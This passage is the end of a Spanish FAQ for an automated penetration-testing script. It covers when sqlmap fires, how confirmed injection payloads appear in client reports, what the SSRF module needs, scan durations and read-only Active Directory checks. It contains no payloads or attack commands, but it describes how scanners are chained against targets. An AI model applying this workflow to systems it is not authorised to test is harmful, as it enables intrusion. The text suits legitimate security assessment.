Porque distintas audiencias necesitan distintos niveles de detalle. El Reporte Censurado es especialmente útil para enviar a directivos o incluir en auditorías de compliance sin exponer la infraestructura interna.

**¿Por qué no se activa sqlmap?**
sqlmap (módulo 21) **solo** se activa si el módulo 13 encontró indicios y estableció `INTEL_SQLI_FOUND=true`. Esto evita falsos positivos y ruido.

**¿Cómo aparecen los payloads confirmados en el Reporte Cliente?**
El módulo que confirma la vulnerabilidad llama a `register_payload()`. Si hay payloads registrados, el Reporte Cliente muestra el badge `✓ INYECCIÓN CONFIRMADA` sobre ese hallazgo y una tabla completa con el payload exacto y URL afectada.

**¿El módulo de SSRF no funciona?**
SSRF necesita URLs con parámetros. Corre primero gobuster [8] y arjun [24] para poblar `INTEL_INJECTABLE_URLS[]`. Luego SSRF [32].

**¿Cuánto tarda un Full Scan?**
- IP local sin servicios web: ~10 min
- Dominio web completo: ~45-90 min
- WordPress con plugins: ~60-120 min
- Con ADPulse en red corporativa: +10-20 min extra
- Con `--mode stealth`: el doble de tiempo

**¿Puedo usar los reportes directamente con clientes?**
El Reporte Censurado está diseñado para eso. Revisa que no haya información sensible antes de enviarlo — los filtros automáticos son buenos pero no perfectos (pueden quedar paths o datos en tablas HTML del detail).

**¿El script modifica el AD o el target?**
No. ADPulse usa LDAP de solo lectura y no crea, modifica ni elimina ningún objeto. Los módulos web hacen solo peticiones de prueba. La excepción es el test HTTP PUT del módulo 37, que intenta subir y luego eliminar un archivo de prueba.

---

*WriestTavo v4.1 — 9261 líneas · 45 módulos · 84 variables INTEL · 173 hallazgos posibles · 4 tipos de reporte · 35 checks AD*
*Última actualización: ver banner al ejecutar*
